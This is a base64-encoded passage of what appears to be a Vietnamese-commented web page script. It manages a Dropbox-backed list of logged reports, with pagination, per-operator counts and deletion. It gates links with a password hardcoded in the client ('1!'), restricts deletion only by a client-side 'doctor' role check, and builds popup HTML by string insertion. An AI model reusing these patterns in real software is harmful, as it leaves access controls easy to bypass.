ICAgIGNvbnN0IGtleSA9IGRhdGU7DQogICAgaWYgKCFjb3VudHNba2V5XSkgY291bnRzW2tleV0gPSB7fTsNCiAgICBjb25zdCBuYW1lID0gKGgub3BlcmF0b3IgfHwgJ0tow7RuZyBjw7MnKS50cmltKCkudG9Mb3dlckNhc2UoKTsNCiAgICBjb3VudHNba2V5XVtuYW1lXSA9IChjb3VudHNba2V5XVtuYW1lXSB8fCAwKSArIDE7DQogIH0pOw0KDQogIGxldCBvdXRsaWVyQ291bnQgPSAwOw0KDQogIE9iamVjdC5rZXlzKGNvdW50cykuZm9yRWFjaChkYXRlID0+IHsNCiAgICBjb25zdCBvcHMgPSBjb3VudHNbZGF0ZV07DQogICAgY29uc3QgZW50cmllcyA9IE9iamVjdC5lbnRyaWVzKG9wcykuc29ydCgoYSwgYikgPT4gYlsxXSAtIGFbMV0pOw0KICAgIGNvbnN0IHRvcCA9IGVudHJpZXNbMF07DQogICAgaWYgKCF0b3ApIHJldHVybjsNCg0KICAgIGNvbnN0IHRvcE5hbWUgPSB0b3BbMF07DQogICAgY29uc3QgdG9wQ291bnQgPSB0b3BbMV07DQoNCiAgICBmb3IgKGNvbnN0IFtuYW1lLCBjb3VudF0gb2YgZW50cmllcykgew0KICAgICAgaWYgKG5hbWUgIT09IHRvcE5hbWUgJiYgY291bnQgPiAwKSB7DQogICAgICAgIG91dGxpZXJDb3VudCArPSBjb3VudDsNCiAgICAgIH0NCiAgICB9DQogIH0pOw0KDQpidG4uaW5uZXJIVE1MID0gYFPhuq9jIHRodeG7kWMgdGhhbmcgPGkgY2xhc3M9ImZhLXNvbGlkIGZhLXRyaWFuZ2xlLWV4Y2xhbWF0aW9uIiBzdHlsZT0iY29sb3I6eWVsbG93Ij48L2k+IDxzcGFuIHN0eWxlPSJjb2xvcjp5ZWxsb3c7IGZvbnQtd2VpZ2h0OmJvbGQiPigke291dGxpZXJDb3VudH0pPC9zcGFuPmA7DQoNCg0KfQ0KPC9zY3JpcHQ+DQo8ZGl2IGlkPSJkcm9wYm94UGFuZWwiIHN0eWxlPSJkaXNwbGF5Om5vbmU7IHBvc2l0aW9uOmZpeGVkOyBpbnNldDowOyBiYWNrZ3JvdW5kOnJnYmEoMCwwLDAsMC41KTsgei1pbmRleDo5OTk5OyI+DQogIDxkaXYgc3R5bGU9Im1hcmdpbjo1JSBhdXRvOyBiYWNrZ3JvdW5kOiNmZmY7IHBhZGRpbmc6MjBweDsgbWF4LXdpZHRoOjkwJTsgYm9yZGVyLXJhZGl1czoxMHB4OyBtYXgtaGVpZ2h0Ojgwdmg7IG92ZXJmbG93OmF1dG8iPg0KICAgPGRpdiBzdHlsZT0iZGlzcGxheTogZmxleDsganVzdGlmeS1jb250ZW50OiBzcGFjZS1iZXR3ZWVuOyBhbGlnbi1pdGVtczogY2VudGVyOyI+DQogIDxoMz7wn5OCIERhbmggc8OhY2ggS2hvYSDEkcOjIHPhu60gZOG7pW5nIHBo4bqnbiBt4buBbTwvaDM+DQogIDxidXR0b24gY2xhc3M9ImJ0biJvbmNsaWNrPSJkb2N1bWVudC5nZXRFbGVtZW50QnlJZCgnZHJvcGJveFBhbmVsJykuc3R5bGUuZGlzcGxheT0nbm9uZScic3R5bGU9InBhZGRpbmc6OHB4IDE0cHg7IGZvbnQtc2l6ZToxM3B4OyBib3JkZXItcmFkaXVzOjRweDsiPg0KICAgIMSQw7NuZw0KICA8L2J1dHRvbj4NCjwvZGl2Pg0KPCEtLSBQYWdpbmF0aW9uIGNvbnRyb2xzIC0tPg0KPGRpdiBpZD0iZHJvcGJveFBhZ2VyIiBzdHlsZT0iZGlzcGxheTpmbGV4O2FsaWduLWl0ZW1zOmNlbnRlcjtnYXA6OHB4O2p1c3RpZnktY29udGVudDpzcGFjZS1iZXR3ZWVuO21hcmdpbi10b3A6MTJweCI+DQogIDxkaXY+DQogICAgSGnhu4NuIHRo4buLDQogICAgPHNlbGVjdCBpZD0iZHJvcGJveFBhZ2VTaXplIiBzdHlsZT0icGFkZGluZzo2cHggOHB4O2JvcmRlcjoxcHggc29saWQgI2RkZDtib3JkZXItcmFkaXVzOjZweCI+DQogICAgICA8b3B0aW9uIHZhbHVlPSIxMCIgc2VsZWN0ZWQ+MTA8L29wdGlvbj4NCiAgICAgIDxvcHRpb24gdmFsdWU9IjIwIj4yMDwvb3B0aW9uPg0KICAgICAgPG9wdGlvbiB2YWx1ZT0iNTAiPjUwPC9vcHRpb24+DQogICAgPC9zZWxlY3Q+DQogICAgZMOybmcgLyB0cmFuZw0KICA8L2Rpdj4NCg0KICA8ZGl2IGlkPSJkcm9wYm94UGFnZUJ1dHRvbnMiIHN0eWxlPSJkaXNwbGF5OmZsZXg7Z2FwOjZweDtmbGV4LXdyYXA6d3JhcCI+PC9kaXY+DQoNCiAgPGRpdiBpZD0iZHJvcGJveFBhZ2VJbmZvIiBzdHlsZT0ibWluLXdpZHRoOjE3MHB4O3RleHQtYWxpZ246cmlnaHQiPjwvZGl2Pg0KPC9kaXY+DQogICAgPHRhYmxlIGJvcmRlcj0iMSIgY2VsbHBhZGRpbmc9IjgiIHN0eWxlPSJ3aWR0aDoxMDAlOyBib3JkZXItY29sbGFwc2U6Y29sbGFwc2U7IGZvbnQtc2l6ZToxNHB4Ij4NCiAgICAgIDx0aGVhZD4NCiAgICAgICAgPHRyPg0KICAgICAgICAgIDx0aD5TVFQ8L3RoPg0KICAgICAgICAgIDx0aD5Uw6puIGtob2E8L3RoPg0KICAgICAgICAgIDx0aD5OZ8OgeTwvdGg+DQogICAgICAgICAgPHRoPlPhuq9jIHRodeG7kWM8L3RoPg0KICAgICAgICAgPHRoPlNhaSB0aOG7nWkgZ2lhbjwvdGg+DQogICAgICAgPHRoPlRyw7luZyBnaeG7nTwvdGg+DQogICAgICAgDQogICAgICAgICAgPHRoPlRo4budaSBnaWFuPC90aD4NCgkJICA8dGg+TGluazwvdGg+DQoJCSAgPHRoPlhvw6E8L3RoPg0KICAgICAgICA8L3RyPg0KICAgICAgPC90aGVhZD4NCiAgICAgIDx0Ym9keSBpZD0iZHJvcGJveEZpbGVMaXN0Ij48L3Rib2R5Pg0KICAgIDwvdGFibGU+DQogIA0KICA8L2Rpdj4NCjwvZGl2PjxzY3JpcHQ+DQphc3luYyBmdW5jdGlvbiBzaG93RHJvcGJveFBhbmVsKCkgew0KYXdhaXQgZW5zdXJlRHJvcGJveCgpOyAvLyDEkeG6o20gYuG6o28gY8OzIERyb3Bib3ggU0RLDQoNCiAgY29uc3QgYWNjZXNzVG9rZW4gPSBhd2FpdCBnZXRBY2Nlc3NUb2tlbigpOw0KICBjb25zdCBkYnggPSBuZXcgRHJvcGJveC5Ecm9wYm94KHsgYWNjZXNzVG9rZW4gfSk7DQogIGNvbnN0IHRib2R5ID0gZG9jdW1lbnQuZ2V0RWxlbWVudEJ5SWQoJ2Ryb3Bib3hGaWxlTGlzdCcpOw0KDQogIC8vIEhp4buHbiBwb3B1cCBuZ2F5IGzhuq1wIHThu6ljIHbhu5tpIHRy4bqhbmcgdGjDoWkgbG9hZGluZw0KICB0Ym9keS5pbm5lckhUTUwgPSBgPHRyPjx0ZCBjb2xzcGFuPSI5IiBzdHlsZT0idGV4dC1hbGlnbjpjZW50ZXI7IGNvbG9yOmJsdWU7Ij4NCiAgICDEkGFuZyB04bqjaSBk4buvIGxp4buHdS4uLg0KICA8L3RkPjwvdHI+YDsNCiAgZG9jdW1lbnQuZ2V0RWxlbWVudEJ5SWQoJ2Ryb3Bib3hQYW5lbCcpLnN0eWxlLmRpc3BsYXkgPSAnYmxvY2snOw0KDQogIHRyeSB7DQogICAgLy8gMSkgS2nhu4NtIHRyYSB04buTbiB04bqhaSBsb2cuanNvbg0KICAgIGxldCBoYXNMb2cgPSBmYWxzZTsNCiAgICBsZXQgcmVzID0gYXdhaXQgZGJ4LmZpbGVzTGlzdEZvbGRlcih7IHBhdGg6ICcvdGh1dGh1YXQnIH0pOw0KICAgIHdoaWxlICh0cnVlKSB7DQogICAgICBpZiAocmVzLnJlc3VsdD8uZW50cmllcz8uc29tZShlID0+IGVbJy50YWcnXSA9PT0gJ2ZpbGUnICYmIGUubmFtZSA9PT0gJ2xvZy5qc29uJykpIHsNCiAgICAgICAgaGFzTG9nID0gdHJ1ZTsNCiAgICAgICAgYnJlYWs7DQogICAgICB9DQogICAgICBpZiAoIXJlcy5yZXN1bHQ/Lmhhc19tb3JlKSBicmVhazsNCiAgICAgIHJlcyA9IGF3YWl0IGRieC5maWxlc0xpc3RGb2xkZXJDb250aW51ZSh7IGN1cnNvcjogcmVzLnJlc3VsdC5jdXJzb3IgfSk7DQogICAgfQ0KDQogICAgLy8gMikgTuG6v3Uga2jDtG5nIGPDsyBmaWxlIOKGkiBj4bqtcCBuaOG6rXQgbuG7mWkgZHVuZw0KICAgIGlmICghaGFzTG9nKSB7DQogICAgICB0Ym9keS5pbm5lckhUTUwgPSBgPHRyPjx0ZCBjb2xzcGFuPSI2IiBzdHlsZT0idGV4dC1hbGlnbjpjZW50ZXI7IGNvbG9yOnJlZDsiPg0KICAgICAgICBLaMO0bmcgY8OzIGRhbmggc8OhY2ggbsOgbyDEkcaw4bujYyBsxrB1DQogICAgICA8L3RkPjwvdHI+YDsNCiAgICAgIHJldHVybjsNCiAgICB9DQoNCiAgICAvLyAzKSBDw7MgZmlsZSDihpIgdOG6o2kgdsOgIGhp4buDbiB0aOG7iw0KICAgIGNvbnN0IGRsID0gYXdhaXQgZGJ4LmZpbGVzRG93bmxvYWQoeyBwYXRoOiAnL3RodXRodWF0L2xvZy5qc29uJyB9KTsNCiAgICBjb25zdCB0ZXh0ID0gYXdhaXQgZGwucmVzdWx0LmZpbGVCbG9iLnRleHQoKTsNCiAgICBsZXQgbG9ncyA9IFtdOw0KICAgIHRyeSB7IGxvZ3MgPSBKU09OLnBhcnNlKHRleHQpOyB9IGNhdGNoIHsgbG9ncyA9IFtdOyB9DQoNCiAgICBpZiAoIWxvZ3MubGVuZ3RoKSB7DQogICAgICB0Ym9keS5pbm5lckhUTUwgPSBgPHRyPjx0ZCBjb2xzcGFuPSI2IiBzdHlsZT0idGV4dC1hbGlnbjpjZW50ZXI7IGNvbG9yOnJlZDsiPg0KICAgICAgICBLaMO0bmcgY8OzIGRhbmggc8OhY2ggbsOgbyDEkcaw4bujYyBsxrB1DQogICAgICA8L3RkPjwvdHI+YDsNCiAgICB9IGVsc2Ugew0KIGNvbnN0IGN1cnJlbnRVc2VyID0gKHNlc3Npb25TdG9yYWdlLmdldEl0ZW0oJ21lZFVzZXInKSB8fCAnJykudG9Mb3dlckNhc2UoKTsNCg0KLy8gUmVuZGVyIG3hu5tpIOKAkyBnaWFvIGNobyBi4buZIHBow6JuIHRyYW5nOg0KREJfTE9HUyA9IGxvZ3M7IC8vIG3huqNuZyBk4buvIGxp4buHdSDEkeG6p3kgxJHhu6cNCkRCX1BBR0UgPSAxOyAgICAvLyB24buBIHRyYW5nIDEgbeG7l2kga2hpIG3hu58gcGFuZWwNCkRCX0NVUlJFTlRfVVNFUiA9IChzZXNzaW9uU3RvcmFnZS5nZXRJdGVtKCdtZWRVc2VyJykgfHwgJycpLnRvTG93ZXJDYXNlKCk7DQoNCmF0dGFjaFBhZ2VyRXZlbnRzT25jZSgpOyAvLyBn4bqvbiBjaGFuZ2UgY2hvIHNlbGVjdCBwYWdlIHNpemUgKGNo4buJIDEgbOG6p24pDQpyZW5kZXJEcm9wYm94UGFnZSgpOyAgICAgLy8gduG6vSB0Ym9keSArIG7DunQgdHJhbmcgdOG7qyBEQl9MT0dTDQogICAgfQ0KICB9IGNhdGNoIChlcnIpIHsNCiAgICBjb25zb2xlLmVycm9yKCdM4buXaSBraGkgxJHhu41jIGRhbmggc8OhY2ggdOG7qyBEcm9wYm94OicsIGVycik7DQogICAgdGJvZHkuaW5uZXJIVE1MID0gYDx0cj48dGQgY29sc3Bhbj0iNiIgc3R5bGU9InRleHQtYWxpZ246Y2VudGVyOyBjb2xvcjpyZWQ7Ij4NCiAgICAgIEtow7RuZyB0aOG7gyB04bqjaSBk4buvIGxp4buHdQ0KICAgIDwvdGQ+PC90cj5gOw0KICB9DQp9DQooZnVuY3Rpb24oKXsNCiAgY29uc3QgcGFnZXIgPSBkb2N1bWVudC5nZXRFbGVtZW50QnlJZCgnZHJvcGJveFBhZ2VyJyk7DQogIGlmIChwYWdlciAmJiAhcGFnZXIuZGF0YXNldC5ib3VuZCkgew0KICAgIHBhZ2VyLmRhdGFzZXQuYm91bmQgPSAnMSc7DQogICAgcGFnZXIuYWRkRXZlbnRMaXN0ZW5lcignY2xpY2snLCBlID0+IGUuc3RvcFByb3BhZ2F0aW9uKCkpOw0KICAgIHBhZ2VyLmFkZEV2ZW50TGlzdGVuZXIoJ21vdXNlZG93bicsIGUgPT4gZS5zdG9wUHJvcGFnYXRpb24oKSk7DQogIH0NCn0pKCk7DQoNCjwvc2NyaXB0Pg0KPHNjcmlwdD4NCmZ1bmN0aW9uIHZlcmlmeUFuZE9wZW5MaW5rKHVybCkgew0KDQoNCiAgLy8gT3ZlcmxheSB04buRaSAoY2xpY2sgdsOgbyBz4bq9IHThuq90KQ0KICBjb25zdCBvdmVybGF5ID0gZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgnZGl2Jyk7DQogIE9iamVjdC5hc3NpZ24ob3ZlcmxheS5zdHlsZSwgew0KICAgIHBvc2l0aW9uOiAnZml4ZWQnLCBpbnNldDogJzAnLCBiYWNrZ3JvdW5kOiAncmdiYSgwLDAsMCwwLjUpJywNCiAgICBkaXNwbGF5OiAnZmxleCcsIGp1c3RpZnlDb250ZW50OiAnY2VudGVyJywgYWxpZ25JdGVtczogJ2NlbnRlcicsDQogICAgekluZGV4OiAnMTAwMDAnDQogIH0pOw0KDQogIC8vIEtodW5nIHBvcHVwDQogIGNvbnN0IGJveCA9IGRvY3VtZW50LmNyZWF0ZUVsZW1lbnQoJ2RpdicpOw0KICBPYmplY3QuYXNzaWduKGJveC5zdHlsZSwgew0KICAgIGJhY2tncm91bmQ6ICcjZmZmJywgcGFkZGluZzogJzI0cHgnLCBib3JkZXJSYWRpdXM6ICcxMHB4JywNCiAgICBtYXhXaWR0aDogJzQyMHB4Jywgd2lkdGg6ICc5MCUnLCBib3hTaGFkb3c6ICcwIDRweCAxMHB4IHJnYmEoMCwwLDAsMC4zKScsDQogICAgZGlzcGxheTogJ2ZsZXgnLCBmbGV4RGlyZWN0aW9uOiAnY29sdW1uJywgYWxpZ25JdGVtczogJ2NlbnRlcicsIGdhcDogJzEycHgnDQogIH0pOw0KDQogIC8vIFRpw6p1IMSR4buBIG5n4bqvbiBn4buNbiAoa2jDtG5nIGPDsyBpY29uL2fhu61pIGThu68gbGnhu4d1KQ0KICBjb25zdCB0aXRsZSA9IGRvY3VtZW50LmNyZWF0ZUVsZW1lbnQoJ2RpdicpOw0KICB0aXRsZS50ZXh0Q29udGVudCA9ICdOaOG6rXAgbeG6rXQga2jhuql1IMSR4buDIG3hu58gbGluayc7DQogIHRpdGxlLnN0eWxlLmZvbnRXZWlnaHQgPSAnNjAwJzsNCg0KICAvLyDDlCBuaOG6rXAgbeG6rXQga2jhuql1DQogIGNvbnN0IGlucHV0ID0gZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgnaW5wdXQnKTsNCiAgT2JqZWN0LmFzc2lnbihpbnB1dCwgeyB0eXBlOiAncGFzc3dvcmQnLCBwbGFjZWhvbGRlcjogJ03huq10IGto4bqpdScgfSk7DQogIE9iamVjdC5hc3NpZ24oaW5wdXQuc3R5bGUsIHsNCiAgICBwYWRkaW5nOiAnMTBweCcsIHdpZHRoOiAnMTAwJScsIGJvcmRlcjogJzFweCBzb2xpZCAjZGRkJywgYm9yZGVyUmFkaXVzOiAnNnB4Jw0KICB9KTsNCg0KICAvLyBUaMO0bmcgYsOhbyBs4buXaSAo4bqpbiBt4bq3YyDEkeG7i25oKQ0KICBjb25zdCBlcnIgPSBkb2N1bWVudC5jcmVhdGVFbGVtZW50KCdkaXYnKTsNCiAgZXJyLnRleHRDb250ZW50ID0gJ+KdjCBTYWkgbeG6rXQga2jhuql1ISc7DQogIE9iamVjdC5hc3NpZ24oZXJyLnN0eWxlLCB7IGNvbG9yOiAncmVkJywgZm9udFNpemU6ICcxNHB4JywgZGlzcGxheTogJ25vbmUnIH0pOw0KDQogIC8vIE7DunQgeMOhYyBuaOG6rW4NCiAgY29uc3QgYnRuID0gZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgnYnV0dG9uJyk7DQogIGJ0bi50ZXh0Q29udGVudCA9ICdYw6FjIG5o4bqtbic7DQogIE9iamVjdC5hc3NpZ24oYnRuLnN0eWxlLCB7DQogICAgcGFkZGluZzogJzEwcHggMTZweCcsIGJhY2tncm91bmQ6ICcjMzQ5OGRiJywgY29sb3I6ICcjZmZmJywNCiAgICBib3JkZXI6ICdub25lJywgYm9yZGVyUmFkaXVzOiAnNnB4JywgY3Vyc29yOiAncG9pbnRlcicNCiAgfSk7DQoNCiAgLy8gUHJvZ3Jlc3MgYmFyICjEkeG6t3QgRMav4buaSSBDw5lORykNCiAgY29uc3QgYmFyV3JhcCA9IGRvY3VtZW50LmNyZWF0ZUVsZW1lbnQoJ2RpdicpOw0KICBPYmplY3QuYXNzaWduKGJhcldyYXAuc3R5bGUsIHsNCiAgICB3aWR0aDogJzEwMCUnLCBiYWNrZ3JvdW5kOiAnI2RkZCcsIGhlaWdodDogJzZweCcsDQogICAgYm9yZGVyUmFkaXVzOiAnM3B4JywgbWFyZ2luVG9wOiAnMTJweCcNCiAgfSk7DQogIGNvbnN0IGJhciA9IGRvY3VtZW50LmNyZWF0ZUVsZW1lbnQoJ2RpdicpOw0KICBPYmplY3QuYXNzaWduKGJhci5zdHlsZSwgeyB3aWR0aDogJzAlJywgaGVpZ2h0OiAnMTAwJScsIGJhY2tncm91bmQ6ICcjMzQ5OGRiJyB9KTsNCiAgYmFyV3JhcC5hcHBlbmRDaGlsZChiYXIpOw0KDQogIC8vIEfhuq9uIHbDoG8gRE9NDQogIGJveC5hcHBlbmRDaGlsZCh0aXRsZSk7DQogIGJveC5hcHBlbmRDaGlsZChpbnB1dCk7DQogIGJveC5hcHBlbmRDaGlsZChlcnIpOw0KICBib3guYXBwZW5kQ2hpbGQoYnRuKTsNCiAgYm94LmFwcGVuZENoaWxkKGJhcldyYXApOw0KICBvdmVybGF5LmFwcGVuZENoaWxkKGJveCk7DQogIGRvY3VtZW50LmJvZHkuYXBwZW5kQ2hpbGQob3ZlcmxheSk7DQoNCiAgLy8gQ2jhurduIGNsaWNrIGLDqm4gdHJvbmcga2jDtG5nIMSRw7NuZw0KICBib3guYWRkRXZlbnRMaXN0ZW5lcignY2xpY2snLCBlID0+IGUuc3RvcFByb3BhZ2F0aW9uKCkpOw0KICAvLyBDbGljayByYSBuZ2/DoGkgxJHhu4MgdOG6r3QNCiAgb3ZlcmxheS5hZGRFdmVudExpc3RlbmVyKCdjbGljaycsICgpID0+IHsNCiAgICBkb2N1bWVudC5ib2R5LnJlbW92ZUNoaWxkKG92ZXJsYXkpOw0KICB9KTsNCg0KICAvLyBY4butIGzDvSB4w6FjIG5o4bqtbg0KICBhc3luYyBmdW5jdGlvbiBzdWJtaXQoKSB7DQogICAgLy8gxJDhu5VpIG3huq10IGto4bqpdSDhu58gxJHDonkNCiAgICBjb25zdCBPSyA9IGlucHV0LnZhbHVlID09PSAnMSEnOw0KDQogICAgaWYgKCFPSykgew0KICAgICAgZXJyLnN0eWxlLmRpc3BsYXkgPSAnYmxvY2snOw0KICAgICAgcmV0dXJuOw0KICAgIH0NCiAgICBlcnIuc3R5bGUuZGlzcGxheSA9ICdub25lJzsNCiAgICBidG4uZGlzYWJsZWQgPSB0cnVlOw0KICAgIGlucHV0LmRpc2FibGVkID0gdHJ1ZTsNCg0KICAgIC8vIEFuaW1hdGUgcHJvZ3Jlc3MgbmhhbmggbMOqbiAxMDAlDQogICAgYmFyLnN0eWxlLnRyYW5zaXRpb24gPSAnd2lkdGggMC42cyBlYXNlJzsNCiAgICByZXF1ZXN0QW5pbWF0aW9uRnJhbWUoKCkgPT4gKGJhci5zdHlsZS53aWR0aCA9ICcxMDAlJykpOw0KICAgIHNldFRpbWVvdXQoKCkgPT4gew0KICAgICAgd2luZG93Lm9wZW4odXJsLCAnX2JsYW5rJyk7DQogICAgICBpZiAob3ZlcmxheS5wYXJlbnROb2RlKSBkb2N1bWVudC5ib2R5LnJlbW92ZUNoaWxkKG92ZXJsYXkpOw0KICAgIH0sIDY1MCk7DQogIH0NCg0KICBidG4uYWRkRXZlbnRMaXN0ZW5lcignY2xpY2snLCBzdWJtaXQpOw0KICBpbnB1dC5hZGRFdmVudExpc3RlbmVyKCdrZXlkb3duJywgKGUpID0+IHsNCiAgICBpZiAoZS5rZXkgPT09ICdFbnRlcicpIHN1Ym1pdCgpOw0KICB9KTsNCg0KICAvLyBGb2N1cyBuZ2F5IMO0IG3huq10IGto4bqpdQ0KICBzZXRUaW1lb3V0KCgpID0+IGlucHV0LmZvY3VzKCksIDApOw0KfQ0KDQpmdW5jdGlvbiBleHRyYWN0RmlsZW5hbWUoZHJvcGJveFByZXZpZXdVcmwpIHsNCiAgdHJ5IHsNCiAgICBjb25zdCB1ID0gbmV3IFVSTChkcm9wYm94UHJldmlld1VybCk7DQogICAgY29uc3QgcCA9IHUuc2VhcmNoUGFyYW1zLmdldCgncHJldmlldycpOw0KICAgIHJldHVybiBkZWNvZGVVUklDb21wb25lbnQocCB8fCAnJyk7DQogIH0gY2F0Y2ggeyByZXR1cm4gJyc7IH0NCn0NCg0KLy8gSOG7mXAgeMOhYyBuaOG6rW4geG/DoSAodHLhuqMgduG7gSBQcm9taXNlPGJvb2xlYW4+KQ0KZnVuY3Rpb24gY29uZmlybURlbGV0ZVBvcHVwKHRleHQ9J0LhuqFuIGPDsyBjaOG6r2MgbXXhu5FuIHhvw6E/Jywgb25lQnV0dG9uPWZhbHNlKSB7DQogIHJldHVybiBuZXcgUHJvbWlzZShyZXNvbHZlID0+IHsNCiAgICBjb25zdCBvdmVybGF5ID0gZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgnZGl2Jyk7DQogICAgT2JqZWN0LmFzc2lnbihvdmVybGF5LnN0eWxlLCB7DQogICAgICBwb3NpdGlvbjonZml4ZWQnLCBpbnNldDonMCcsIGJhY2tncm91bmQ6J3JnYmEoMCwwLDAsMC41KScsDQogICAgICBkaXNwbGF5OidmbGV4JywgYWxpZ25JdGVtczonY2VudGVyJywganVzdGlmeUNvbnRlbnQ6J2NlbnRlcicsIHpJbmRleDoxMDAwMQ0KICAgIH0pOw0KDQogICAgY29uc3QgYm94ID0gZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgnZGl2Jyk7DQogICAgT2JqZWN0LmFzc2lnbihib3guc3R5bGUsIHsNCiAgICAgIGJhY2tncm91bmQ6JyNmZmYnLCBwYWRkaW5nOicyMHB4JywgYm9yZGVyUmFkaXVzOic4cHgnLA0KICAgICAgbWF4V2lkdGg6JzQyMHB4Jywgd2lkdGg6JzkwJScsIGJveFNoYWRvdzonMCA0cHggMTJweCByZ2JhKDAsMCwwLC4yNSknLA0KICAgICAgZm9udEZhbWlseTonSW50ZXIsIHNhbnMtc2VyaWYnDQogICAgfSk7DQoNCiAgICBib3guaW5uZXJIVE1MID0gYA0KICAgICAgPGRpdiBzdHlsZT0iZm9udC13ZWlnaHQ6NjAwOyBtYXJnaW4tYm90dG9tOjhweCI+WMOhYyBuaOG6rW4geG/DoTwvZGl2Pg0KICAgICAgPGRpdiBzdHlsZT0ibWFyZ2luLWJvdHRvbToxNHB4Ij4ke3RleHR9PC9kaXY+DQogICAgICA8ZGl2IHN0eWxlPSJkaXNwbGF5OmZsZXg7IGdhcDoxMHB4OyBqdXN0aWZ5LWNvbnRlbnQ6ZmxleC1lbmQiPg0KICAgICAgICA8YnV0dG9uIGlkPSJkbGdDYW5jZWwiIGNsYXNzPSJidG4iIHN0eWxlPSJiYWNrZ3JvdW5kOiM3ZjhjOGQiPkh14bu3PC9idXR0b24+DQogICAgICAgICR7IW9uZUJ1dHRvbiA/IGA8YnV0dG9uIGlkPSJkbGdZZXMiIGNsYXNzPSJidG4iIHN0eWxlPSJiYWNrZ3JvdW5kOiNlNzRjM2MiPlhvw6E8L2J1dHRvbj5gIDogJyd9DQogICAgICA8L2Rpdj4NCiAgICBgOw0KDQogICAgb3ZlcmxheS5hcHBlbmRDaGlsZChib3gpOw0KICAgIGRvY3VtZW50LmJvZHkuYXBwZW5kQ2hpbGQob3ZlcmxheSk7DQoNCiAgICBib3guYWRkRXZlbnRMaXN0ZW5lcignY2xpY2snLCBlID0+IGUuc3RvcFByb3BhZ2F0aW9uKCkpOw0KICAgIG92ZXJsYXkuYWRkRXZlbnRMaXN0ZW5lcignY2xpY2snLCAoKSA9PiB7IGRvY3VtZW50LmJvZHkucmVtb3ZlQ2hpbGQob3ZlcmxheSk7IHJlc29sdmUoZmFsc2UpOyB9KTsNCiAgICBib3gucXVlcnlTZWxlY3RvcignI2RsZ0NhbmNlbCcpLmFkZEV2ZW50TGlzdGVuZXIoJ2NsaWNrJywgKCkgPT4geyBkb2N1bWVudC5ib2R5LnJlbW92ZUNoaWxkKG92ZXJsYXkpOyByZXNvbHZlKGZhbHNlKTsgfSk7DQoNCiAgICBpZiAoIW9uZUJ1dHRvbikgew0KICAgICAgYm94LnF1ZXJ5U2VsZWN0b3IoJyNkbGdZZXMnKS5hZGRFdmVudExpc3RlbmVyKCdjbGljaycsICgpID0+IHsgZG9jdW1lbnQuYm9keS5yZW1vdmVDaGlsZChvdmVybGF5KTsgcmVzb2x2ZSh0cnVlKTsgfSk7DQogICAgfQ0KICB9KTsNCn0NCg0KLy8gWG/DoSAxIGVudHJ5IGxvZyArIGZpbGUgRXhjZWwgdHLDqm4gRHJvcGJveCAodGhlbyBpbmRleCB0cm9uZyBt4bqjbmcgbG9ncykNCmFzeW5jIGZ1bmN0aW9uIGRlbGV0ZUxvZ0FuZEZpbGVfQnlJbmRleChpZHgpIHsNCiAgY29uc3QgYWNjZXNzVG9rZW4gPSBhd2FpdCBnZXRBY2Nlc3NUb2tlbigpOw0KICBjb25zdCBkYnggPSBuZXcgRHJvcGJveC5Ecm9wYm94KHsgYWNjZXNzVG9rZW4gfSk7DQogIGNvbnN0IGxvZ1BhdGggPSAnL3RodXRodWF0L2xvZy5qc29uJzsNCg0KICAvLyAxKSBU4bqjaSBsb2cuanNvbiBoaeG7h24gdOG6oWkNCiAgbGV0IGxvZ3MgPSBbXTsNCiAgdHJ5IHsNCiAgICBjb25zdCBkbCA9IGF3YWl0IGRieC5maWxlc0Rvd25sb2FkKHsgcGF0aDogbG9nUGF0aCB9KTsNCiAgICBjb25zdCB0ZXh0ID0gYXdhaXQgZGwucmVzdWx0LmZpbGVCbG9iLnRleHQoKTsNCiAgICBsb2dzID0gSlNPTi5wYXJzZSh0ZXh0IHx8ICdbXScpOw0KICB9IGNhdGNoIChlKSB7DQogICAgYWxlcnQoJ0tow7RuZyDEkeG7jWMgxJHGsOG7o2MgbG9nLmpzb24gdHLDqm4gRHJvcGJveC4nKTsgDQogICAgdGhyb3cgZTsNCiAgfQ0KDQogIGNvbnN0IGl0ZW0gPSBsb2dzW2lkeF07DQogIGlmICghaXRlbSkgeyBhbGVydCgnS2jDtG5nIHTDrG0gdGjhuqV5IG3hu6VjIGPhuqduIHhvw6EuJyk7IHJldHVybjsgfQ0KDQogIC8vIDIpIEzhuqV5IGZpbGVOYW1lICYgeG/DoSBmaWxlIEV4Y2VsIChu4bq/dSBjw7MpDQogIGNvbnN0IGZpbGVOYW1lID0gZXh0cmFjdEZpbGVuYW1lKGl0ZW0ubGluayB8fCAnJyk7DQogIGNvbnN0IGZpbGVQYXRoID0gZmlsZU5hbWUgPyBgL3RodXRodWF0LyR7ZmlsZU5hbWV9YCA6IG51bGw7DQoNCiAgdHJ5IHsNCiAgICBpZiAoZmlsZVBhdGgpIHsgYXdhaXQgZGJ4LmZpbGVzRGVsZXRlVjIoeyBwYXRoOiBmaWxlUGF0aCB9KTsgfQ0KICB9IGNhdGNoIChlKSB7DQogICAgLy8gTuG6v3UgZmlsZSBraMO0bmcgdOG7k24gdOG6oWkgduG6q24gdGnhur9wIHThu6VjIHhvw6EgbG9nDQogICAgY29uc29sZS53YXJuKCdYb8OhIGZpbGUgRXhjZWwgbOG7l2kva2jDtG5nIHThu5NuIHThuqFpLCB0aeG6v3AgdOG7pWMgeG/DoSBsb2cuLi4nLCBlKTsNCiAgfQ0KDQogIC8vIDMpIEPhuq1wIG5o4bqtdCBsb2c6IGLhu48gcGjhuqduIHThu60gaWR4IHbDoCBnaGkgxJHDqCBs4bqhaQ0KICBsb2dzLnNwbGljZShpZHgsIDEpOw0KICBhd2FpdCBkYnguZmlsZXNVcGxvYWQoew0KICAgIHBhdGg6IGxvZ1BhdGgsDQogICAgY29udGVudHM6IEpTT04uc3RyaW5naWZ5KGxvZ3MsIG51bGwsIDIpLA0KICAgIG1vZGU6IHsgJy50YWcnOiAnb3ZlcndyaXRlJyB9LA0KICAgIGF1dG9yZW5hbWU6IGZhbHNlDQogIH0pOw0KfQ0KDQoNCmFzeW5jIGZ1bmN0aW9uIG9uRGVsZXRlTG9nUm93KGluZGV4SW5Mb2dzLCBjdXJyZW50VXNlcikgew0KICAvLyBO4bq/dSBraMO0bmcgcGjhuqNpIGRvY3RvciDihpIgcG9wdXAgY+G6pW0geG/DoSwgY2jhu4kgY8OzIDEgbsO6dCBIdeG7tw0KICBpZiAoY3VycmVudFVzZXIgIT09ICdkb2N0b3InKSB7DQogI